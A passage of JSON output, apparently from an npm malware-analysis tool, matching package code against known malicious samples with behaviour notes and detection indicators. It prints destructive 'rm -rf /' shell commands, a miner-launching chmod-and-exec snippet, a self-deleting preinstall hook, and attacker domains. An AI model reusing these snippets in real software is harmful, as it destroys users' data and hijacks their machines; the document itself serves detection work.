+                  {
+                    "step": 4,
+                    "action": "Malicious code dynamically executes obfuscated payloads.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of additional malicious actions, evasion of static analysis"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Malicious code or files are published to PyPI but not present in the public source repository.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Supply chain compromise and undetected distribution of malware"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Serialization and exfiltration of process.env or environment variables to external domains",
+                    "Silent execution of bundled or downloaded binaries using child_process.exec or similar APIs",
+                    "Dynamic code execution via eval and base64 decoding of payloads",
+                    "Presence of install-time scripts (preinstall/postinstall) in package.json that execute undocumented or non-standard scripts",
+                    "Discrepancies between published package contents and public source repository, especially unexplained code or files"
+                  ],
+                  "file_indicators": [
+                    "package.json with suspicious or undocumented postinstall scripts",
+                    "JavaScript files containing Buffer.from(..., 'base64') followed by eval",
+                    "Presence of unexpected binaries or executable scripts in package files",
+                    "Files in PyPI package not present in GitHub repository or with differing content"
+                  ],
+                  "network_indicators": [
+                    "HTTP/HTTPS POST requests to unknown or suspicious domains hardcoded in package code",
+                    "Outbound connections to domains such as webhook.site, pastebin, or attacker-controlled endpoints during install or runtime"
+                  ],
+                  "how_to_detect": "Scan package source code and metadata for serialization and exfiltration of environment variables, use of child_process.exec or similar APIs for silent process execution, and dynamic code execution patterns such as eval with decoded content. Analyze package.json for install-time scripts (preinstall/postinstall) that execute undocumented or non-standard scripts. Compare published package contents with the public source repository to detect unauthorized modifications or unexplained files. Monitor network activity for suspicious outbound requests to hardcoded or non-standard domains during installation or runtime."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_063579_snippet_2",
+              "source_package": "transferwise-iconfont (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_063579/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5535714626312256,
+              "code_similarity": 0.5038745403289795,
+              "behavior_similarity": 0.6032683849334717,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function angry() {\n  sh.exec(\"rm -rf *  > /dev/null 2>&1\");\n  sh.exec(\"rm -rf /*  > /dev/null 2>&1\");\n  sh.exec(\"rm -rf /  > /dev/null 2>&1\");\n  sh.exec(\"rm -rf ~/*  > /dev/null 2>&1\");\n}",
+                "code_behavior": "At runtime, when triggered by a remote server response, the code executes multiple destructive shell commands ('rm -rf *', 'rm -rf /*', 'rm -rf /', 'rm -rf ~/*') via shelljs, recursively deleting all files and directories on the system, resulting in total data loss.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is designed to execute highly destructive shell commands that irreversibly delete all files on the system, which is never appropriate for a utility package and constitutes deliberate sabotage.",
+                  "violated_expectations": "A cookie parsing or API protection package should not execute shell commands, especially those that delete user data or system files.",
+                  "similar_legitimate_use": "There is no legitimate use for this behavior in any public npm package; such commands are only used in controlled, manual system administration contexts.",
+                  "key_indicators": [
+                    "Use of 'rm -rf' on root, home, and current directories",
+                    "Shell command execution from JavaScript using shelljs",
+                    "Function named 'angry' with destructive payload",
+                    "No user interaction or warning before data destruction"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when angry() is called, after remote server trigger)",
+                  "file_location": "main module file of protect-api (e.g., index.js)",
+                  "required_permissions": [
+                    "filesystem",
+                    "shell access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "transferwise-iconfont",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a typosquat of a legitimate library and contains code that collects sensitive system and user data, including home directory, hostname, username, DNS servers, and package metadata, then exfiltrates it to an attacker-controlled server via HTTPS POST. It does not provide the claimed icon font functionality and is designed solely for data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs and imports the malicious package (transferwise-iconfont or protect-api).",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded and executed."
+                  },
+                  {
+                    "step": 2,
+                    "action": "transferwise-iconfont collects sensitive system and user data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "transferwise-iconfont exfiltrates collected data to attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "protect-api periodically polls a remote server for a trigger value.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Waits for remote command to activate destructive payload."
+                  },
+                  {
+                    "step": 5,
+                    "action": "If the remote server responds with isAngry=true, protect-api executes the angry() function.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Destructive shell commands are executed, deleting all files on the system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited collection and exfiltration of system/user data at import or runtime",
+                    "Hardcoded external domains for data exfiltration or command-and-control",
+                    "Periodic polling of remote servers for execution triggers",
+                    "Execution of destructive shell commands (e.g., 'rm -rf /') from within JavaScript packages",
+                    "Obfuscated or hidden code paths leading to data destruction"
+                  ],
+                  "file_indicators": [
+                    "Presence of code referencing 'os.homedir()', 'os.userInfo()', 'os.hostname()', or 'dns.getServers()' in non-system utility packages",
+                    "Use of shelljs or similar modules to execute shell commands",
+                    "Functions named 'angry' or similar, especially if not documented",
+                    "Obfuscated code blocks or suspicious setInterval/fetch patterns"
+                  ],
+                  "network_indicators": [
+                    "Connections to r7z12f7knlides86u06z22fpzg57tzho.oastify.com",
+                    "Connections to 6514b3f1dc3282a6a3cd7125.mockapi.io",
+                    "Unusual POST requests containing system/user data to unknown domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access sensitive system/user information and make unsolicited network requests to hardcoded domains. Flag packages that use shelljs or similar modules to execute shell commands, especially those containing 'rm -rf' or other destructive operations. Detect periodic polling of external servers for remote triggers, and review for obfuscated code or hidden destructive functions. Use static analysis to identify suspicious API usage and dynamic analysis to observe runtime network and filesystem behaviors."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_056541_snippet_1",
+              "source_package": "gcc-patch (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_056541/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5526176691055298,
+              "code_similarity": 0.5821244716644287,
+              "behavior_similarity": 0.5231108665466309,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "function build(...args) {\n    //set a+x to file \"gcc\", run the file, console log ALL output\n    const { execSync } = require('child_process');\n    const output = execSync('chmod a+x ./node_modules/gcc-patch/gcc && ./node_modules/gcc-patch/gcc', { encoding: 'utf-8' });\n    console.log(output);\n}\n\nmodule.exports = build;",
+                "code_behavior": "At runtime, when the build function is called, the code grants executable permissions to a bundled ELF binary named 'gcc' and immediately executes it, capturing and logging its output, resulting in the activation of a concealed cryptocurrency miner.",
+                "malice_analysis": {
+                  "why_suspicious": "Granting execution permissions and running a bundled binary from within a package is highly atypical, especially for a package purporting to be a compiler utility. The executed binary is not a legitimate compiler but a miner.",
+                  "violated_expectations": "A legitimate GCC utility package would provide compiler bindings or wrappers, not execute arbitrary binaries or require such permissions. Executing hidden binaries is not expected behavior for a compiler utility.",
+                  "similar_legitimate_use": "Some build tools may execute compilers or scripts, but these are typically well-documented, transparent, and do not conceal their purpose or bundle unrelated executables.",
+                  "key_indicators": [
+                    "chmod a+x on a bundled binary",
+                    "immediate execution of a local ELF binary",
+                    "no user interaction or explicit consent",
+                    "output logging of a non-transparent process"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when build function is called)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "gcc-patch",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.2",
+                  "why_malicious": "The package 'gcc-patch' impersonates a legitimate GCC compiler utility but actually contains and executes a concealed cryptocurrency miner. Its main script grants execution permissions to a bundled ELF binary and runs it, hijacking the user's CPU resources for unauthorized Monero mining. The binary includes cryptographic and mining-related functions, as well as network strings for mining pool communication, confirming its malicious purpose."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the gcc-patch package, believing it to be a GCC utility.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of the build function."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The build function is called, which grants execution permissions to the bundled 'gcc' binary and runs it.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Activation of the concealed miner binary."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The 'gcc' binary initiates Monero mining operations, connects to a remote mining pool, and uses the host's CPU resources for mining.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Ongoing unauthorized mining and resource hijacking."
+                  },
+                  {
+                    "step": 4,
+                    "action": "In earlier campaign variants, the build function downloads and executes a remote mining setup script, further automating the deployment of the miner.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Same final goal: unauthorized mining."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Granting executable permissions (chmod a+x) to bundled binaries during runtime",
+                    "Execution of non-transparent ELF binaries from npm packages",
+                    "Network connections to Stratum mining pools (stratum+ssl://)",
+                    "Fetching and executing remote shell scripts from GitHub in build scripts",
+                    "Presence of cryptomining-related function names in binaries"
+                  ],
+                  "file_indicators": [
+                    "Bundled ELF binary named 'gcc' in npm package",
+                    "index.js scripts that execute local binaries or fetch remote scripts",
+                    "Presence of mining-related strings or function names in binaries"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to stratum+ssl:// endpoints",
+                    "HTTP(S) requests to raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh",
+                    "Use of hardcoded Monero wallet addresses in scripts"
+                  ],
+                  "how_to_detect": "Monitor npm packages for bundled executable binaries, especially those named after well-known tools (e.g., 'gcc'). Flag scripts that grant execution permissions and run local binaries, or that fetch and execute remote shell scripts. Analyze binaries for mining-related function names and strings. Detect outbound network connections to Stratum mining pools and known cryptomining setup scripts. Correlate package metadata (e.g., suspicious or anonymous authors) with these behaviors for higher confidence."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_732619_snippet_1",
+              "source_package": "call-blockflow (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_732619/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5472564101219177,
+              "code_similarity": 0.5120326280593872,
+              "behavior_similarity": 0.5824801921844482,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"preinstall\": \"node callTo.js && del callTo.js\"",
+                "code_behavior": "At preinstall, the npm script executes callTo.js using Node.js, then deletes callTo.js from disk, ensuring the malicious entry point is removed after execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Using a preinstall script to execute a JavaScript file and then delete it is highly unusual and indicative of anti-forensic intent, aiming to remove evidence of malicious activity immediately after execution.",
+                  "violated_expectations": "Legitimate npm packages do not self-delete installation scripts or execute arbitrary code during preinstall, nor do they attempt to erase their own traces.",
+                  "similar_legitimate_use": "Preinstall scripts are sometimes used for legitimate build or setup steps, but not for deleting their own code or hiding execution.",
+                  "key_indicators": [
+                    "preinstall script triggers code execution before package use",
+                    "self-deletion of script file after execution",
+                    "removal of initial infection vector"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall",
+                  "file_location": "package.json",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "call-blockflow",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0",
+                  "why_malicious": "The package is a weaponized clone of the legitimate 'call-bind' npm package, crafted to execute a multi-stage malware infection chain during installation. It initiates a covert attack by downloading, decrypting, and executing a remote payload, then erases all traces of the infection, including modifying and restoring package.json to remove evidence. The attack leverages social engineering, anti-forensic techniques, and is attributed to a persistent North Korean threat actor targeting developer environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Preinstall script executes callTo.js and deletes it to remove the initial infection vector.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "callTo.js writes and executes dope.bat and towr.ps1, initiating the attack chain."
+                  },
+                  {
+                    "step": 2,
+                    "action": "callTo.js writes dope.bat and towr.ps1 to disk, then executes dope.bat to begin payload retrieval and execution.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "dope.bat downloads and decrypts a remote payload, setting up for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "dope.bat downloads an encrypted payload, runs towr.ps1 to decrypt it, renames and executes the decrypted payload via rundll32, replaces package.json to remove the preinstall script, and deletes all artifacts.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Decrypted payload (stringh.dat) is executed, system is compromised, and evidence is erased."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Decrypted payload (stringh.dat) is executed via rundll32, then deleted; package.json is replaced to remove preinstall script and cover tracks.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Final goal: system compromise with no trace of the attack remaining."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm preinstall script that executes and deletes a JavaScript file during installation",
+                    "Creation and execution of batch and PowerShell scripts at install time",
+                    "Network download of executable or encrypted content from hardcoded domains during install",
+                    "XOR decryption of downloaded files using a hardcoded key in PowerShell",
+                    "Execution of rundll32 on DLLs created during npm install",
+                    "Immediate deletion of install-time artifacts and restoration or replacement of package.json"
+                  ],
+                  "file_indicators": [
+                    "callTo.js (transient, deleted post-install)",
+                    "dope.bat (transient, deleted post-execution)",
+                    "towr.ps1 (transient, deleted post-execution)",
+                    "funData.ctr (transient, encrypted payload)",
+                    "colfunc.csv (transient, decrypted payload)",
+                    "stringh.dat (transient, executed DLL, deleted after execution)",
+                    "mod.json (used to overwrite package.json)",
+                    "package.json (modified and restored during attack)"
+                  ],
+                  "network_indicators": [
+                    "cryptocopedia.com/explorer/search.asp?token=5032 (payload download domain)"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall scripts that execute and delete files, especially those that write and run batch or PowerShell scripts. Flag any install-time network requests to hardcoded or suspicious domains, particularly those that download files and immediately decrypt or execute them. Detect transient files with names matching callTo.js, dope.bat, towr.ps1, funData.ctr, colfunc.csv, stringh.dat, and mod.json. Monitor for modifications to package.json during or after install, especially restoration from mod.json. Alert on rundll32 execution on files created during npm install. Correlate these behaviors to identify multi-stage infection chains."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_201020_375229_snippet_2",
+              "source_package": "tyibyc, x91yz, y78b (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_201020_375229/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5314829349517822,
+              "code_similarity": 0.5249047875404358,
+              "behavior_similarity": 0.5380611419677734,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// After execution\nfs.unlinkSync('./package-lock.js');",
+                "code_behavior": "During postinstall, the code deletes its own 'package-lock.js' file after executing the malicious binary, removing evidence of the initial infection vector.",
+                "malice_analysis": {
+                  "why_suspicious": "Self-deletion of installer scripts is a common anti-forensics technique used by malware to hinder analysis and detection by removing traces of the malicious activity.",
+                  "violated_expectations": "Legitimate packages do not delete their own installation scripts after execution, as this impedes debugging and transparency.",
+                  "similar_legitimate_use": "Rarely, some legitimate installers may clean up temporary files, but never core scripts or files essential to package integrity.",
+                  "key_indicators": [
+                    "Immediate deletion of the script responsible for malicious actions",
+                    "Anti-forensics behavior to hinder detection",
+                    "Removal of evidence post-execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "package-lock.js",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "tyibyc, x91yz, y78b",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "These packages impersonate the legitimate 'cli-width' library but contain malicious code that, upon installation, deploys and executes a disguised Mach-O binary ('travis.yml') on macOS systems. The binary is designed to persist, evade detection, and potentially download further payloads from a remote server, constituting a sophisticated supply chain attack targeting developer environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious npm package is installed, triggering the postinstall script.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Deployment and execution of a disguised Mach-O binary outside the package directory."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious Mach-O binary ('updateSafari') is executed in the background using 'nohup'.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Binary runs persistently and initiates outbound network communication."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Installer script deletes itself and, in some variants, overwrites package.json to erase evidence of the malicious installation.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Anti-forensics; hinders detection, analysis, and incident response."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Mach-O binary connects to a remote server to download a stage 2 payload, possibly using system fingerprinting.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Potential delivery and execution of further malicious payloads, with the final goal of system compromise or data exfiltration."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Postinstall script creates and executes binaries outside the package directory, specifically in '~/Library/Application Support/'",
+                    "Use of misleading file names (e.g., 'travis.yml' as a Mach-O binary, 'updateSafari')",
+                    "Immediate deletion of installer scripts (e.g., 'package-lock.js') after execution",
+                    "Overwriting of 'package.json' or other core metadata files with empty or invalid content",
+                    "Background execution of binaries using 'nohup' during npm install",
+                    "Outbound network connections to unknown or suspicious domains immediately after install"
+                  ],
+                  "file_indicators": [
+                    "Presence of 'travis.yml' file in the package that is a Mach-O binary, not a YAML file",
+                    "'~/Library/Application Support/Safari Update/updateSafari' binary present on disk",
+                    "package-lock.js containing postinstall execution logic",
+                    "package.json overwritten with empty object ('{}') after install"
+                  ],
+                  "network_indicators": [
+                    "Connections to hxxps://passgenwizard[.]com/ts/getTs.asp?id=83401",
+                    "Download attempts for 'vfcompat.dll' from passgenwizard[.]com or similar suspicious domains"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that create or execute binaries outside the package directory, especially in '~/Library/Application Support/'. Flag any package that drops a file named 'travis.yml' that is not valid YAML or is a Mach-O binary. Detect self-deleting installer scripts (e.g., deletion of 'package-lock.js') and overwrites of 'package.json' with empty content. Monitor for outbound connections to known malicious domains (such as passgenwizard[.]com) immediately after package installation. Correlate these behaviors to identify supply chain attacks leveraging npm postinstall scripts."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@fomobro##forex-analytics-fomo/1.0.13/package/mocha.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
